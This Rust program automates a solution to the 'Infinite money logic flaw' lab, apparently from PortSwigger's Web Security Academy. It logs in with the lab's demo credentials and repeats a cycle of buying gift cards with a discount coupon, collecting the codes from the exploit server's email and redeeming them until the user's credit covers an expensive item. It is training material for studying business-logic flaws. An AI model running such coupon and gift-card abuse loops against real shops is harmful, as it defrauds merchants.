/*****************************************************************************
*
* Lab: Infinite money logic flaw
*
* Hack Steps: 
*      1. Fetch the login page
*      2. Extract the csrf token and session cookie
*      3. Login as wiener
*      4. Fetch wiener's profile
*      5. Extract the csrf token needed for subsequent requests
*      6. Add 10 gift cards to the cart
*      7. Apply the coupon SIGNUP30
*      8. Place order
*      9. Fetch the email client
*     10. Collect the received gift card codes
*     11. Redeem the codes one by one
*     12. Repeat the stpes from 6 to 11 multiple times (after 43 times, 
*         you will have the price of the leather jacket and a little more)
*     13. Add the leather jacket the cart
*     14. Plac order
*     15. Confirm order
*
******************************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use select::{document::Document, predicate::Attr};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

const LAB_URL: &str = "https://0a0000de034429fb81bf7b7a00fa001c.web-security-academy.net"; // Change this to your lab URL
const EXPLOIT_DOMAIN: &str = "exploit-0a8300ed0373293181267a03017d0062.exploit-server.net"; // Change this to your exploit DOMAIN

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Fetching the login page.. ");
    flush_terminal();

    let login_page = fetch(&format!("{LAB_URL}/login"));

    println!("{}", "OK".green());
    print!("{}", "⦗2⦘ Extracting the csrf token and session cookie.. ");
    flush_terminal();

    let mut session = get_session_cookie(&login_page);
    let mut csrf_token = get_csrf_token(login_page);

    println!("{}", "OK".green());
    print!("⦗3⦘ Logging in as wiener.. ");
    flush_terminal();

    let login = login_as_wiener(&session, &csrf_token);

    println!("{}", "OK".green());
    print!("⦗4⦘ Fetching wiener's profile.. ");
    flush_terminal();

    session = get_session_cookie(&login);
    let wiener_profile = fetch_with_session(&format!("{LAB_URL}/my-account"), &session);

    println!("{}", "OK".green());
    print!("⦗5⦘ Extracting the csrf token needed for subsequent requests.. ");
    flush_terminal();

    csrf_token = get_csrf_token(wiener_profile);

    println!("{}", "OK".green());

    // after 43 times you will have the price of the leather jacket and a little more
    for counter in 1..44 {
        print!("⦗6⦘ Adding 10 gift cards to the cart ({}/43).. ", counter);
        flush_terminal();

        add_product_to_cart(2, 10, &session);

        println!("{}", "OK".green());
        print!("⦗7⦘ Applying the coupon {}.. ", "SIGNUP30".yellow());
        flush_terminal();

        apply_coupon(&session, &csrf_token);

        println!("{}", "OK".green());
        print!("⦗8⦘ Placing order.. ");
        flush_terminal();

        place_order(&session, &csrf_token);

        println!("{}", "OK".green());
        print!("⦗9⦘ Fetching the email client.. ");
        flush_terminal();

        let email_client = fetch(&format!("https://{EXPLOIT_DOMAIN}/email"));

        println!("{}", "OK".green());
        print!("⦗10⦘ Collecting the received gift card codes.. ");
        flush_terminal();

        let body = email_client.text().unwrap();
        let codes = collect_codes(&body);

        println!("{}", "OK".green());

        for (index, code) in codes.iter().enumerate() {
            print!(
                "\r⦗11⦘ Redeeming the code {} ({}/10).. ",
                code.yellow(),
                index + 1
            );
            flush_terminal();

            redeem_code(code, &session, &csrf_token);
        }

        println!("{}", "OK".green());
    }

    print!("⦗12⦘ Adding the leather jacket the cart.. ");
    flush_terminal();

    add_product_to_cart(1, 1, &session);

    println!("{}", "OK".green());
    print!("⦗13⦘ Placing order.. ");
    flush_terminal();

    place_order(&session, &csrf_token);

    println!("{}", "OK".green());
    print!("⦗14⦘ Confirming order.. ");
    flush_terminal();

    fetch_with_session(
        &format!("{LAB_URL}/cart/order-confirmation?order-confirmed=true"),
        &session,
    );

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch(path: &str) -> Response {
    WEB_CLIENT
        .get(path)
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn login_as_wiener(session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
            ("csrf", &csrf_token),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()))
}

fn add_product_to_cart(product_id: i32, quantity: i32, session: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/cart"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("productId", product_id.to_string()),
            ("redir", "PRODUCT".to_string()),
            ("quantity", quantity.to_string()),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to add the leather jacket to the cart with a modified price".red()
        ))
}

fn apply_coupon(session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/cart/coupon"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("coupon", "SIGNUP30"),
            ("csrf", &csrf_token),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to apply the coupon".red()))
}

fn collect_codes(body: &str) -> Vec<String> {
    let mut codes = Vec::new();
    let pattern = Regex::new(r"Your gift card code is:\s*(.*)\s*Thanks,").unwrap();
    let captures = pattern.captures_iter(&body);
    for c in captures.take(10) {
        let card = c.get(1).unwrap().as_str().to_string();
        codes.push(card);
    }
    codes
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(path)
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn redeem_code(code: &str, session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/gift-card"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([("gift-card", code), ("csrf", &csrf_token)]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to redeem the code".red()))
}

fn place_order(session: &str, csrf_token: &str) -> Response {
    WEB_CLIENT
        .post(format!("{LAB_URL}/cart/checkout"))
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([("csrf", &csrf_token)]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to place order".red()))
}

fn get_csrf_token(response: Response) -> String {
    let document = Document::from(response.text().unwrap().as_str());
    document
        .find(Attr("name", "csrf"))
        .find_map(|f| f.attr("value"))
        .expect(&format!("{}", "⦗!⦘ Failed to get the csrf".red()))
        .to_string()
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
